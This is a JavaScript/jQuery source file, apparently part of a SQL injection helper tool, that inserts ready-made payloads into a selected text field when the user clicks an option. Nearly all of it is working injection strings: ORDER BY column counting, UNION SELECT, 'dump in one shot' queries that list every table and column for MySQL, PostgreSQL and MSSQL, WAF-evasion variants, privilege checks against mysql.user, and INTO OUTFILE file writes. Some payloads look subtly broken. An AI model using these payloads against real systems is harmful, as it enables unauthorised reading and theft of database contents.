$(document).ready(function() {
	$(function() {
		$(".opt-unionbased").on("click", function() {
			let opt = this.id;
			var string = '';
			var rep = '';
			var str = '';
			var data = [];
			var dbNameFinal = '';

			switch (opt) {
				/*------COLUMN COUNT: ORDER BY------*/
				case "orderby":
					string = 'ORDER BY 1';
					break;

				/*------COLUMN COUNT: +ORDER+BY+------*/
				case "orderby2":
					string = '+ORDER+BY+1';
					break;

				/*------COLUMN COUNT: GROUP BY------*/
				case "groupby":
					string = 'GROUP BY ' + iGroupBy();
					break;

				/*------COLUMN COUNT: +GROUP+BY+------*/
				case "groupby2":
					string = '+GROUP+BY+' + iGroupBy();
					break;

				/*------COLUMN COUNT: PROCEDURE ANALYSE()------*/
				case "procedure":
					string = '+PROCEDURE+ANALYSE()';
					break;

				/*------COLUMN COUNT: SELECT * FROM------*/
				case "selectall":
					str = getSelectedText();
					string = "'+AND+(SELECT * FROM " + str + ')=(SELECT 1)--+';
					break;

				/*------UNION STATEMENT: +UNION+SELECT+INT,INT------*/
				case "unintplus1":
					string = "+UNION+SELECT+" + arrayColumns().join(',');
					break;

				/*------UNION STATEMENT: +UNION+ALL+SELECT+INT,INT------*/
				case "unintplus2":
					string = "+UNION+ALL+SELECT+" + arrayColumns().join(',');
					break;

				/*------UNION STATEMENT: +UNION+SELECT+INT,INT------*/
				case "unintplus3":
					result = arrayColumns().join('),(');
					string = "+UNION(SELECT(" + result + ")" + ")";
					break;

				/*------UNION STATEMENT: +UNION+SELECT+null,null------*/
				case "unullplus1":
					rep = iNull();
					string = "+UNION+SELECT+" + rep.substr(0, rep.length - 1) + "";
					break;

				/*------UNION STATEMENT: +UNION+ALL+SELECT+null,null------*/
				case "unullplus2":
					rep = iNull();
					string = "+UNION+ALL+SELECT+" + rep.substr(0, rep.length - 1) + "";
					break;

				/*------LOCAL DIOS: LOCAL DIOS 1------*/
				case "localdios1":
					string = " div @s:=( concat(@c:=0x00,if((select count(*)/*!50000from*/ /*!50000information_schema*/.arrayColumns where table_schema=database/**X**/() and @c:=concat(@c, 0x3c62723e, /*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)) /*!50000union*/ select " + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 2------*/
				case "localdios2":
					string = " +DiV@x:=(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2)) /*!50000union*/+ALL+SELECT+" + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 3------*/
				case "localdios3":
					string = " and@:=(seleCt GrOup_ConcAt(0x3c62723e,Table_name,column_name) frOm /*!50000information_schema.arrayColumns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61) /*!50000Union*/ Select " + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 4------*/
				case "localdios4":
					string = " and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.arrayColumns WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 5------*/
				case "localdios5":
					string = " and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.arrayColumns WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 6------*/
				case "localdios6":
					string = "and@x:=(Select+/*!50000export_set*/(5,@:=0,(select+count(*)from(/*!50000information_schema.arrayColumns*/)where@:=export_set(5,/*!50000export_set*/(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))/*!50000UNION*/ ALL SELECT " + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 7------*/
				case "localdios7":
					string = " and @s:=(select(@s)from(select(@s:=0x00),(@nr:=0),(select (0)from/*!50000information_schema*/.arrayColumns where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@s:=concat(@s,0x3c666f6e7420636f6c6f723d7265643e,lpad(@nr:=@nr%2b1,3,0x30),0x3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20,/*!50000table_name*/,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e20,/*!50000column_name*/,0x3c2f666f6e743e3c62723e))))x)/*!50000union*/ select +" + arrayColumns().join(',');
					break;

				/*------LOCAL DIOS: LOCAL DIOS 8------*/
				case "localdios8":
					string = "and@:=(SeLeCt /*!50000GrOup_ConCat(0x3c6c693e,/*!50000TaBle_naMe,0x207e20,/*!50000ColuMn_naMe*/)FrOm /*!50000inForMatiOn_scHeMa*/.arrayColumns where table_schema=database/**_**/()) /*!50000union*/ select " + arrayColumns().join(',');
					break;

				/*------+INTO+OUTFILE+"path/of/file"------*/
				case "intoutfile":
					var path = getSelectedText();
					string = "+INTO+OUTFILE+\"" + path + "\"";
					break;

				/*------PRIVILEGES CHECK VIA IS.PRIVILEGES------*/
				case "privi1":
					string = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
					break;

				/*------PRIVILEGES CHECK VIA MYSQL SYSTEM TABLE------*/
				case "privi2":
					string = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
					break;

				/*------GET RUNNING QUERY------*/
				case "runquery":
					string = "(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;

				/*------DB_NAMES GROUP_CONCAT()------*/
				case "db1":
					string = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
					break;

				/*------DB_NAMES ONE SHOT------*/
				case "db2":
					string = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
					break;

				/*------DB_NAMES FRM TABLE NAME------*/
				case "db3":
					string = "(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')";
					break;

				/*------DB_NAMES FRM TABLE NAME WAF------*/
				case "db4":
					string = "(select /*!50000group_Concat(*/table_schema) from {f information_schema.tables} where table_name = 'admin')";
					break;

				/*------TABLE_NAMES GROUP CONCAT()------*/
				case "tbl1":
					dbNameFinal = iDbtbl("Database name", "DATABASE()");
					string = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + dbNameFinal + ")";
					break;

				/*------TABLE_NAMES ONE SHOT------*/
				case "tbl2":
					string = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)";
					break;

				/*------TABLE_NAMES ONE SHOT------*/
				case "tbl3":
					string = "concat(0x636f756e743a20, (Select count(0) from admin))";
					break;

				/*------NAME GROUP CONCAT------*/
				case "clmn1":
					dbNameFinal = iDbtbl("Table name", "[INSERT_TABLE]");
					string = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + dbNameFinal + ")";
					break;

				/*------COLUMN NAME ONE SHOT------*/
				case "clmn2":
					string = "concat(0x636f756e743a20, (Select count(0) from admin))";
					break;

				/*------DATA GROUP CONCAT------*/
				case "data1":
					data = iDbTblClmn("hex");
					string = "(SELECT+GROUP_CONCAT(" + data[0] + "+SEPARATOR+0x3c62723e)+FROM+" + data[1] + ")";
					break;

				/*------DATA ONE SHOT------*/
				case "data2":
					data = iDbTblClmn("hex");
					string = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + data[1] + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + data[0] + ",0x3c62723e))))x)";
					break;

				/*------DATA SECOND SHOT------*/
				case "data3":
					data = iDbTblClmn("normal");
					string = "(SELECT+GROUP_CONCAT(0x3c62723e," + data[0] + ")+FROM (" + data[1] + "))";
					break;

				/*------DATA THIRD SHOT------*/
				case "data4":
					data = iDbTblClmn("normal");
					string = "concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + data[1] + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + data[0] + ",0x3c62723e))))x))";
					break;

				/*------DIOS BY T-PRO------*/
				case "diostpro":
					dbNameFinal = iDbtbl("Database name", "DATABASE()");
					string = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)";
					break;

				/*------DIOS BY DR.Z3R0------*/
				case "diosz3r0":
					string = "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
					break;

				/*------DIOS SET BY TR0JAN (WAF)------*/
				case "diostr01":
					string = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!())),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
					break;

				/*------DIOS SET BY TR0JAN (BENCHMARK)------*/
				case "diostr02":
					string = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
					break;

				/*------DIOS SET BY MAKMAN (NORMAL)------*/
				case "diosmak1":
					string = "concat(,,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
					break;

				/*------DIOS SET BY MAKMAN (WAF)------*/
				case "diosmakwaf":
					dbNameFinal = iDbtbl("Database name", "DATABASE()");
					string = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.arrayColumns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
					break;

				/*------DIOS SET BY MADBLOOD (NORMAL)------*/
				case "diosmad1":
					string = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.arrayColumns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
					break;

				/*------DIOS SET BY MADBLOOD (WAF)------*/
				case "diosmadwaf":
					string = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.arrayColumns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
					break;

				/*------DIOS SET BY MADBLOOD (X@)------*/
				case "diosmad@X":
					string = "+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.arrayColumns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+";
					break;

				/*------DIOS SET BY ZEN (NORMAL 1)------*/
				case "dioszen1":
					string = "make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
					break;

				/*------DIOS SET BY ZEN (NORMAL 2)------*/
				case "dioszen2":
					string = "/*!50000make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)*/";
					break;

				/*------DIOS SET BY ZEN (WAF)------*/
				case "dioszenwaf":
					string = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`arrayColumns`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
					break;

				/*------DIOS SET BY AKJARO------*/
				case "diosakjaro":
					string = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.arrayColumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
					break;

				/*------DIOS POSTGRESQL 8.4------*/
				case "PostgreSQL1":
					string = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;

				/*------DIOS POSTGRESQL 9.1------*/
				case "PostgreSQL2":
					string = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;

				/*------DIOS POSTGRESQL ALL VERSION------*/
				case "PostgreSQL3":
					string = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
					break;

				/*------DIOS MSSQL BY RUMMY / ZEN------*/
				case "mssql":
					string = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";
					break;

				default:
					string = "www.facebook.com/Jalkhov";
			}
			setSelectedText(string);
		});
	});
});